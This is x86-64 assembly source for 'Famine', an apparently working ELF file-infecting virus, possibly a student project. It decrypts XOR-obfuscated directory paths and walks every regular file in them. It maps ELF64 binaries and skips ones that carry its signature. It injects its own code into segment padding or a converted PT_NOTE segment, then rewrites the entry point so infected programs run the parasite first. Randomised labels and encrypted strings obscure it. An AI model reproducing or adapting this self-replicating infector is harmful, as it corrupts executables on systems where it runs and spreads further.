; %include "famine.inc"
%include "obf_file.inc"

bits 64 
default rel

section .text
global _start

_start:
; placing u2rzAAKL on the stack
push rbp
mov rbp, rsp
PUSHA
lea rdi, [rel WCXwV]     ; dir to open for arg readDir
mov rsi, cku4U
call llFg3Cui

lea rdi, [rel Bd0uGw7Dbe]
mov rsi, O1dGY
call llFg3Cui
JMXxjT21:
POPA
mov rsp, rbp
pop rbp
S4umhz0C:
jmp XnLD8Za86

; take directory to open in rdi && size of pwd on rsi
llFg3Cui:
push rbp
mov rbp, rsp
push rax
push rsi
call dtSx0
mov rdi, rax
pop rsi
pop rax
sub rsp, u2rzAAKL_size
push rsi
lea r8, FAM(u2rzAAKL.gEasjg)
or qword [r8], -1
lea r8, FAM(u2rzAAKL.vVSOBeEv)
; mov r10, [rdi]
mov [r8], rdi
lea r8, FAM(u2rzAAKL.nCPWqsX)
mov [r8], rsi
mov rax, 2
mov rsi, 0x0000| O_DIRECTORY 
xor rdx, rdx
syscall
cmp rax, 0 
pop rsi        ; Get the XTihElMdb9 size back to unmap
jl D19lTxhau
lea rdi, FAM(u2rzAAKL.gEasjg)             ; enregistre le gEasjg dans la struct
mov [rdi], rax

PMdyXI:
lea r10, FAM(u2rzAAKL.gEasjg)
mov rdi, [r10]
lea r9, FAM(u2rzAAKL.WovBKGNR)              ; init WovBKGNR
mov DWORD[r9], 0 
mov rax, 217; getdents64(int gEasjg, void *buf, size_t size_buf) 
lea rsi, FAM(u2rzAAKL.Zx4R0U0)
mov rdx, 0x1000
syscall
cmp rax, 0 
jle D19lTxhau

lea r10, FAM(u2rzAAKL.WHyq9Id)  ; r10 -> (struct u2rzAAKL.diretents_struct_ptr)
mov [r10], rsi                           ; u2rzAAKL.WHyq9Id -> u2rzAAKL.Zx4R0U0
lea r11, FAM(u2rzAAKL.Dw7BNGMqP7)       ; r11 -> (struct u2rzAAKL.Dw7BNGMqP7)
mov DWORD [r11], eax ; u2rzAAKL.Dw7BNGMqP7 = getdents total length 

ZFIWqeh:
lea r8, FAM(u2rzAAKL.WovBKGNR)        ; r8 -> total lu de getdents
lea r9, FAM(u2rzAAKL.Dw7BNGMqP7)        ; r9 -> total a lire de getdents
mov r10, FAM(u2rzAAKL.WHyq9Id)  ; r10 -> actual dirent struct
lea r11, FAM(u2rzAAKL.WHyq9Id)  ; r11 -> ptr de la struct actuelle
movzx r12, WORD [r10 + D_RECLEN_OFF] ; r12 = length de la stuct Zx4R0U0 actuelle 
add [r8], r12d                          ; update du total lu dans r8
add [r11], r12                           ; u2rzAAKL.diretns_struct_ptr -> sur la prochaine struct
cmp BYTE [r10 + D_TYPE], 0x8; verifie le type du fichier 
jne XZMEafXwZ

vezlv4Zm6:
lea rsi, [r10 + D_NAME] ; charge le nom du fichier dans rsi 
mov byte [rsi - 1], '/'
sub rsi, FAM(u2rzAAKL.nCPWqsX)
mov rdi, FAM(u2rzAAKL.vVSOBeEv)
call ZNMXZ5qv

RKcO0U:
call rKXNgbpI

XZMEafXwZ:
mov r8, FAM(u2rzAAKL.WovBKGNR)
mov r12, FAM(u2rzAAKL.Dw7BNGMqP7)
cmp r8d, r12d                   ; if (total lu >= total getdents)
mov rdi, FAM(u2rzAAKL.vVSOBeEv)
mov rsi, FAM(u2rzAAKL.nCPWqsX)
jge PMdyXI
jmp ZFIWqeh

rKXNgbpI:
push rbp
mov rbp, rsp
sub rsp, KpgTnnql_size
lea rax, INF(KpgTnnql.GP8J7)
mov qword [rax], 0 
lea rax, INF(KpgTnnql.zORr2QV)
mov byte [rax], 0 
lea rax, INF(KpgTnnql.vHciMjzdfE)
mov qword [rax], 0 

S4tq05e:
mov rax, 2
mov rdi, rsi
mov rsi, 0x0002
xor rdx, rdx
syscall
cmp rax, 0x0 
jl XGoaI
mov INF(KpgTnnql.MfN3A), rax

; === get file size ===
WFsH1A:
mov rax, 8
mov rdi, INF(KpgTnnql.MfN3A)
mov rsi, 0x0 
mov rdx, 0x2
syscall
cmp rax, 0x0 
jle JKPbhRo
mov INF(KpgTnnql.APPAAWeB49), rax
mov INF(KpgTnnql.QfP6qV), rax

v94ZJvY5b9:
; rax -> map
mov rsi, rax        ; rsi = file_size
mov rax, 9
mov rdi, 0x0 
mov rdx, 2| 4| 1
mov r10, 1
mov r8, INF(KpgTnnql.MfN3A)
mov r9, 0x0 
syscall
cmp rax, 0x0 ; rax -> map (used later) 
jl JKPbhRo
lea r8, INF(KpgTnnql.K1K5MwObY)
mov [r8], rax

iHp1g4m:
cmp dword [rax + 1], 0x02464c45 ; if != 'ELF64' 
jne x2Day

oqiCryAg3G:
; rax == total segment number
; r9 == injection offset
; r13 == original segment end offset
; r14 -> header table
; r15 -> map
mov r15, rax
mov r14, r15
add r14, [r14 + DhKUDH3.swhPUiCf]
xor rcx, rcx
qvF6N2cTs:
cmp cx, [r15  + DhKUDH3.yA0GiC]
jge ZoV4SG8 
add r14, eysWeV_size
inc rcx
jmp qvF6N2cTs
ZoV4SG8:
mov INF(KpgTnnql.XGyY0), r14
xor r9, r9
JzlMIgKZ3w:
cmp cx, 0 
jle SdPo59N
lWafxzpP1l:
bt word [r14], 0 ; is segment header's first bit != 0 
jnc lMFvo
bt qword [r14], 0x20 ; is segment header's 33rd bit == 1 
jc A3Z06uwoT
lMFvo:
dec rcx
sub r14, eysWeV_size
jmp JzlMIgKZ3w

SdPo59N:
mov r9, INF(KpgTnnql.GP8J7)
cmp r9, 0 
je x2Day
cmp byte INF(KpgTnnql.zORr2QV), 1 ; if new page needed jump _add page 
je lrXWv
jmp e4NygFDF          ; else jmp e4NygFDF

A3Z06uwoT:
; Check if the segment signed, else check the size, if big enough save the offsets if not already done
CJ437a:
; r8 -> potential qXfBROv5l
; r9 == qXfBROv5l variable
mov r8, r15
add r8, [r14 + eysWeV.SVomPCQ]
add r8, [r14 + eysWeV.H2CSN]
sub r8, rlZ8ZnCr6H
; mov r9, [rel qXfBROv5l]
lea r9, qXfBROv5l
; mov rdi, r9
; mov rsi, rlZ8ZnCr6H
; push rax
; call dtSx0
; mov r9, rax
; pop rax
mov r10, [r9]
cmp qword r10, [r8]
je x2Day
mov rdi, r9
mov rsi, rlZ8ZnCr6H
push rcx
call HPp7bfMC
pop rcx

Hl02n6U2h:
mov r9, INF(KpgTnnql.GP8J7)
test r9, r9
jz lpK6I8
mov r9, INF(KpgTnnql.zORr2QV)
test r9, r9
jz lMFvo

lpK6I8:
; r8 == end of KpgTnnql offset
; r9 == next segment offset
mov r8, [r14 + eysWeV.SVomPCQ]
add r8, [r14 + eysWeV.H2CSN]
mov r13, r8        ; save segment end's offset
add r8, CODE_LEN 
mov r9, r14
add r9, eysWeV_size
add r9, eysWeV.SVomPCQ
cmp [r9], r8
setb INF(KpgTnnql.zORr2QV)   ; if ([r9] < r8) { KpgTnnql.zORr2QV = 1) }

kzEskZkhoz:
; r8 -> KpgTnnql structure members
; r9 == injection address
; r12 == original entrypoint
;*r13 == segment end's offset (lpK6I8)
;*r14 -> segment header in header table
lea r8, INF(KpgTnnql.eA1Xqq)
mov [r8], cl
lea r8, INF(KpgTnnql.QMXCdEiSp)
mov r12, [r15 + DhKUDH3.FxChjYy]
mov [r8], r12
lea r8, INF(KpgTnnql.GP8J7)
mov [r8], r13
lea r8, INF(KpgTnnql.NuvpHW0Et)
push r9
mov r9, [r14 + eysWeV.h1boz]
add r9, [r14 + eysWeV.crMm6]
mov [r8], r9
pop r9
lea r8, INF(KpgTnnql.uzlFZZDvB)
mov [r8], r14
jmp lMFvo

lrXWv:
hoCTkLu90:
mov rax, 77
mov rdi, INF(KpgTnnql.MfN3A)
lea rsi, INF(KpgTnnql.APPAAWeB49)
push qword [rsi]
add qword [rsi], 0x1000
and qword [rsi], -4096
add qword [rsi], CODE_LEN 
mov rsi, [rsi]
syscall
pop rsi
cmp rax, 0 
jl x2Day

zlF8w6NU:
mov rdi, INF(KpgTnnql.K1K5MwObY)
mov rax, 11
syscall

Jtgbj5v:
mov rax, 9
mov rdi, 0x0 
mov rsi, INF(KpgTnnql.APPAAWeB49)    ; rsi = file_size
mov rdx, 2| 4| 1
mov r10, 1
mov r8, INF(KpgTnnql.MfN3A)
mov r9, 0x0 
syscall
cmp rax, 0x0 ; rax -> map (used later) 
jl JKPbhRo
lea r8, INF(KpgTnnql.K1K5MwObY)
mov [r8], rax

u5iHcxAyi0:
mov r14, INF(KpgTnnql.K1K5MwObY)
movzx rax, word [r14 + DhKUDH3.fUvnzTf]
add r14, [r14 + DhKUDH3.awj5eW]
xor rcx, rcx

Nn9bRE:
cmp rcx, rax
jge sYutSt
mov rbx, [r14 + uONbqnFOqh.xYF0I]
add rbx, [r14 + uONbqnFOqh.GxbofXb6IU]
cmp INF(KpgTnnql.vHciMjzdfE), rbx
jge KVHjydf
mov INF(KpgTnnql.vHciMjzdfE), rbx

KVHjydf:
add r14, uONbqnFOqh_size
inc rcx
jmp Nn9bRE

sYutSt:

jXr4FNNTB:
; r14 -> segmentS header
; rcx == segment counter
mov r14, INF(KpgTnnql.K1K5MwObY)
movzx rax, word [r14 + DhKUDH3.yA0GiC]
add r14, [r14 + DhKUDH3.swhPUiCf]
xor rcx, rcx

YnAwc:
cmp rcx, rax
jge KqTwFIjDB5
cmp dword [r14 + eysWeV.mxHN6], 0x4
je u7eUpgSQh

oS1nO:
add r14, eysWeV_size
inc rcx
jmp YnAwc

KqTwFIjDB5:
mov r14, -1 ; detect if no note found. See u7eUpgSQh line 1 

u7eUpgSQh:
; r14 -> segment header
; rax == new offset / address
cmp r14, 0 
jl AGi7FzXD
mov dword [r14 + eysWeV.mxHN6], 0x1
mov qword [r14 + eysWeV.KqcOiRj3U], 0x1| 0x4
mov qword [r14 + eysWeV.H2CSN], CODE_LEN 
mov qword [r14 + eysWeV.crMm6], CODE_LEN 
mov qword [r14 + eysWeV.hvVTAQuwwI], 0x1000 
mov rax, INF(KpgTnnql.QfP6qV)
add rax, 0x1000 
and rax, -4096
mov qword [r14 + eysWeV.SVomPCQ], rax
mov qword INF(KpgTnnql.GP8J7), rax
mov rax, INF(KpgTnnql.vHciMjzdfE)
add rax, 0x1000 
and rax, -4096
mov qword INF(KpgTnnql.NuvpHW0Et), rax
mov qword [r14 + eysWeV.h1boz], rax
mov qword [r14 + eysWeV.frDmKU10gH], rax

e4NygFDF:
pivDZjLvp:
; r8 -> elf header entrypoint
; r9 == end of segment + align (injection offset)
; r10 == injection offset
mov r8, INF(KpgTnnql.K1K5MwObY)
add r8, DhKUDH3.FxChjYy
mov r10, INF(KpgTnnql.NuvpHW0Et)
mov [r8], r10
cmp byte INF(KpgTnnql.zORr2QV), 0 
jg MTlBv2U
mov rdi, CODE_LEN 
call WS5nXOKzFl

MTlBv2U:
; rdi -> injection start
; rsi -> parasite _start
; rcx == code len (Vb8XvBo - _start)
mov rdi, INF(KpgTnnql.K1K5MwObY)
add rdi, INF(KpgTnnql.GP8J7)
lea rsi, [rel _start]     ; rsi -> start of our code
mov rcx, CODE_LEN ; counter will decrement 
cld          ; copy from _start to Vb8XvBo (= !std)
rep movsb

AGi7FzXD:
; r8 -> S4umhz0C instruction's addr (S4umhz0C + 1)
; r9 == distance to jump from final jump to original entry point
mov r8, INF(KpgTnnql.K1K5MwObY)
add r8, INF(KpgTnnql.GP8J7)
add r8, FINJMP_OFF 
inc r8
mov r10, INF(KpgTnnql.NuvpHW0Et)
add r10, FINJMP_OFF 
add r10, 0x05 
mov r9, INF(KpgTnnql.QMXCdEiSp)
sub r9, r10
mov [r8], r9d
jmp x2Day

WS5nXOKzFl:
; r8 -> segment header data
;*r14 -> segment header in header table

mov r8, INF(KpgTnnql.uzlFZZDvB)
push r8           ; save header start for later

; * Update file size *
add r8, qword eysWeV.H2CSN
add qword [r8], rdi
pop r8

; * Update memory size *
add r8, eysWeV.crMm6
add qword [r8], rdi

ret

x2Day:
lea rdi, INF(KpgTnnql.K1K5MwObY)
lea rsi, INF(KpgTnnql.APPAAWeB49)
call HPp7bfMC
jmp JKPbhRo

HPp7bfMC:
mov rax, 11
syscall
ret

JKPbhRo:
mov rax, 3
mov rdi, INF(KpgTnnql.MfN3A)
syscall
mov qword INF(KpgTnnql.MfN3A), -1
jmp XGoaI

D19lTxhau:
mov rdi, FAM(u2rzAAKL.gEasjg)
cmp rdi, 0 
jle XGoaI
mov rax, 3
syscall
mov rdi, FAM(u2rzAAKL.vVSOBeEv)
mov rsi, FAM(u2rzAAKL.nCPWqsX)
call HPp7bfMC
or qword FAM(u2rzAAKL.gEasjg), -1
jmp XGoaI

XGoaI:
leave
ret

XnLD8Za86:
mov rax, 60 
xor rdi, rdi
syscall

;strcpy(dst:rsi src: rdi) (without /0 at the end)
ZNMXZ5qv:
xor rcx, rcx
u5lLzRn1:
cmp byte [rdi + rcx], 0 
je rLv2JJ
mov al, byte [rdi + rcx]
mov [rsi + rcx], al
add rcx, 1 
jmp u5lLzRn1

rLv2JJ:
; mov byte [rsi + rcx], 0 
ret

; rax: char *_decrypt_str(rsi: char *to_decrypt, rdi: len)
dtSx0:
; rax == div quotient
; rbx -> to_decrypt
; rcx == counter
; rdx == div modulo
; r9 == len CxXSgUslL0
; r10 -> key_char
; r11 -> decrypted str (mmap)
; r12 == len to_decrypt
; rsi -> CxXSgUslL0
push rbx
push rcx
push rdx
push r8
push r9
push r10
push r11
push r12
mov rbx, rdi
mov r12, rsi
xor rdi, rdi ; addr = NULL (let kernel choose) 
mov rdx, 0x03 ; 2| 4= 1 | 2 = 3 
mov r10, 0x22 ; MAP_PRIVATE | MAP_ANONYMOUS = 0x2 | 0x20 = 0x22 
mov r8, -1                      ; gEasjg = -1
xor r9, r9 ; offset = 0 
mov rax, 9 ; syscall number for mmap 
syscall
cmp rax, 0 
jl axlsmSd
mov r11, rax
lea rsi, CxXSgUslL0
call o6k7QRrmJd
mov r9, rax
xor rcx, rcx
xor rdx, rdx
rRg9HJ:
cmp rcx, r12
jge axlsmSd
mov rax, rcx
xor rdx, rdx
cmp rcx, 0 
jne jLwqATLJ5
xor rax, rax
jmp biMNX
jLwqATLJ5:
div r9
biMNX:
movzx r10, byte [rsi + rdx] ; r10 == CxXSgUslL0[rcx % CxXSgUslL0_len]
xor r10b, [rbx + rcx]
mov [r11 + rcx], r10b
inc rcx
jmp rRg9HJ
axlsmSd:
mov rax, r11
pop r12
pop r11
pop r10
pop r9
pop r8
pop rdx
pop rcx
pop rbx
ret

; debug
; strlen(str:rsi)
o6k7QRrmJd:
xor rcx, rcx

vuLB11Mz:
cmp byte [rsi + rcx], 0 
je fkNl3
inc rcx
jmp vuLB11Mz

fkNl3:
mov rax, rcx
ret


B2vWs dq 0x45 
XTihElMdb9 db 0x7F, 0x1A, 0x52, 0x2B, 0x27, 0x21, 0x15, 0x6B, 0x1A, 0x0B, 0x2B, 0x35, 0x59, 0x49 
WCXwV db 0x11, 0x3D, 0x56, 0x36, 0x78, 0x39, 0x15, 0x4B, 0x1A, 0x79 
cku4U    equ $ - WCXwV
Bd0uGw7Dbe db 0x11, 0x3D, 0x56, 0x36, 0x78, 0x39, 0x15, 0x4B, 0x1A, 0x4B, 0x42 
O1dGY    equ $ - Bd0uGw7Dbe
CxXSgUslL0 db 0x3E, 0x49, 0x3B, 0x46, 0x57, 0x4D, 0x70, 0x38, 0x6E, 0x79, 0x42, 0x5B 
VqC64 db 0x44, 0x22, 0x22, 0x22, 0x22, 0x00 
qXfBROv5l db "Famine version 1.0 (c)oded by anvincen-eedy", 0x0 
rlZ8ZnCr6H equ $ - qXfBROv5l
Vb8XvBo: 